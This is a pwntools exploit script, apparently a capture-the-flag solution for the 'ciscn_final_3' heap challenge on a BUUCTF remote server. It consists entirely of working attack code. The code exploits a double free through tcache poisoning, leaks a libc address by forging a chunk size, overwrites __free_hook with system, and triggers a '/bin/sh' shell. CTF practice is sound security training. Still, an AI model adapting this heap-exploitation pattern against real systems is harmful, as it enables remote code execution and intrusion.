from pwn import *
context.log_level = 'debug'

# io = process(['./ciscn_final_3'])
io = remote('node4.buuoj.cn', 28938)
libc = ELF('./libc.so.6')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
heap_addr = [0] * 0x18

def add(index, size, content):
	sla(b'choice > ', b'1')
	sla(b'input the index\n', str(index).encode())
	sla(b'input the size\n', str(size).encode())
	sa(b'now you can write something\n', content)
	io.recvuntil(b'gift :0x')
	heap_addr[index] = int(io.recvuntil(b'\n', drop=True), 16)	

def delete(index):
	sla(b'choice > ', b'2')
	sla(b'input the index\n', str(index).encode())

add(0, 0x70, b'\n')
add(1, 0x40, b'\n')
add(2, 0x70, b'/bin/sh\n')
add(3, 0x60, b'\n')
add(4, 0x60, b'\n')
add(5, 0x60, b'\n')
add(6, 0x70, b'\n')
add(7, 0x70, b'\n')
add(8, 0x70, b'\n')

add(9, 0x10, b'\n')

delete(0)
delete(0)
delete(1)

add(10, 0x70, p64(heap_addr[0] - 0x10) + b'\n')
add(11, 0x70, b'\n')
add(12, 0x70, b'A' * 0x8 + p64(0x421) + b'\n')
delete(0)
add(13, 0x70, b'\n')
add(14, 0x40, b'\n')
add(15, 0x40, b'\x00')	# to main_arena + 96
__malloc_hook = heap_addr[15] - 0x70
base = __malloc_hook - libc.symbols['__malloc_hook']
log.info('libc base = ' + hex(base))
__free_hook = base + libc.symbols['__free_hook']
log.info('__free_hook = ' + hex(__free_hook))
system = base + libc.symbols['system']

delete(4)
delete(4)
add(16, 0x60, p64(__free_hook) + b'\n')
add(17, 0x60, b'\n')
add(18, 0x60, p64(system) + b'\n')
delete(2)
# gdb.attach(io)
# time.sleep(3)
io.interactive()
